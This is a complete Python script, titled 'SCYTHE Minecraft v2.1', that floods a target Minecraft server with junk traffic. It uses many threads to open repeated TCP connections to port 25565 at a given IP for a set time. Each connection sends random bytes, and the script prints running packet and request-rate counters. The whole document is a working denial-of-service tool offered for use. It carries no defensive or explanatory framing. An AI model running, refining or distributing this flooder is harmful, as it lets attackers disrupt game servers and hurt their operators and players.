# SCYTHE Minecraft v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 5: print('Usage: python3 minecraft.py <ip> <throttle> <threads> <time>'); sys.exit(1)
ip, throttle, threads, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
print(f'[SCYTHE] Minecraft: {ip}:25565 | {duration}s')
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(2); s.connect((ip, 25565))
      s.send(b'\x00\x00' + random._urandom(100))
      s.close();
      with lock: total += 1
    except: pass
for _ in range(threads):
  threading.Thread(target=flood, daemon=True).start()
start = time.time()
while time.time() - start < duration:
  print(f'[MINECRAFT] Packets: {total} | RPS: {int(total/max(1,time.time()-start))} | Elapsed: {time.time()-start:.1f}s')
  time.sleep(1)
print(f'[MINECRAFT] Completed: {total} packets')